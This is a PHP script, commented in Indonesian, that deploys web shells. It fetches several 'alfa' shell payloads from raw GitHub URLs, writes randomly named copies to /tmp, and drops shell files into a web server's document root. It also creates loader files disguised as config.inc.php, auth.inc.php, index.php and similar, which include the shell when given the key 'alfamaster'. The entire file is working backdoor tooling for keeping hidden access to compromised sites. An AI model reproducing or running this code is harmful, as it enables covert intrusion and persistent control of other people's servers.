// ============ FUNCTIONS ============
function getContent($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $data = curl_exec($ch);
        curl_close($ch);
        if ($data && strlen($data) > 100) return $data;
    }
    return @file_get_contents($url);
}

function randomName() {
    return substr(md5(uniqid(mt_rand(), true)), 0, 16) . '.' . rand(10000000, 99999999) . '.' . rand(10000000, 99999999) . '.php';
}

function createFolder($path) {
    if (!is_dir($path)) {
        @mkdir($path, 0777, true);
        return true;
    }
    return true;
}

function chmodFolder($path, $perm) {
    if (is_dir($path)) {
        $octal = octdec($perm);
        @chmod($path, $octal);
        return true;
    }
    return false;
}

function createShellFile($path, $content) {
    if (@file_put_contents($path, $content)) {
        @chmod($path, 0644);
        return true;
    }
    return false;
}

function createLoader($path, $shell_path, $key = 'alfamaster') {
    $content = '<?php
$key = isset($_GET["key"]) ? $_GET["key"] : "";
if ($key !== "' . $key . '") die("404 - Not Found");
if (file_exists("' . $shell_path . '")) {
    include "' . $shell_path . '";
} else {
    die("❌ Shell not found");
}
?>';
    if (@file_put_contents($path, $content)) {
        @chmod($path, 0644);
        return true;
    }
    return false;
}

// ============ SOURCES ============
$sources = [
    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfaavataryleh.txt',
    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfafuqiang.txt',
    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfatintin.txt',
    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/filemanagerantisession.txt',
    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfaanaksekolah.txt',
];

// ============ DEPLOY SHELL KE /tmp/ ============
$deployed = [];
foreach ($sources as $src) {
    $content = getContent($src);
    if ($content && strlen($content) > 100) {
        for ($i = 0; $i < 3; $i++) {
            $name = randomName();
            $path = '/tmp/' . $name;
            if (@file_put_contents($path, $content)) {
                @chmod($path, 0644);
                $deployed[] = ['file' => $name, 'path' => $path, 'source' => basename($src)];
            }
        }
    }
}

// ============ AMBIL SHELL TERBARU ============
$shell_files = glob('/tmp/*.php');
usort($shell_files, function($a, $b) {
    return filemtime($a) - filemtime($b);
});
$latest_shell = end($shell_files);
$shell_content = file_get_contents($latest_shell);

// ============ DOCUMENT ROOT ============
$doc_root = $_SERVER['DOCUMENT_ROOT'];

// ============ PROSES ACTION ============
$messages = [];
if ($action === 'deploy') {
    $src_folder = $base_path . '/src';
    $sourcemap_folder = $base_path . '/SourceMap';
    
    // Buat folder
    $folders = [$doc_root . '/' . $src_folder, $doc_root . '/' . $sourcemap_folder];
    foreach ($folders as $folder) {
        if (createFolder($folder)) {
            chmodFolder($folder, $permission);
            $messages[] = "✅ Folder: " . str_replace($doc_root, '', $folder) . " [{$permission}]";
        }
    }
    
    // Buat 5 file shell
    foreach ($file_names as $name) {
        if (!empty($name)) {
            $path = $doc_root . '/' . $src_folder . '/' . $name;
            if (createShellFile($path, $shell_content)) {
                $messages[] = "✅ File: {$name}";
            }
        }
    }
    
    // Buat loader di SourceMap
    $loaders = ['config.inc.php', 'settings.inc.php', 'cache.inc.php', 'session.inc.php', 'auth.inc.php', 'loader.inc.php', 'index.php', 'shell.php'];
    foreach ($loaders as $loader) {
        $path = $doc_root . '/' . $sourcemap_folder . '/' . $loader;
        if (createLoader($path, $latest_shell)) {
            $messages[] = "✅ Loader: {$loader}";
        }
    }
}

// ============ CLEAN ============
if (isset($_GET['clean'])) {
    foreach (glob('/tmp/*.php') as $f) @unlink($f);
    $messages[] = "🧹 Cleaned all shells in /tmp/";
}
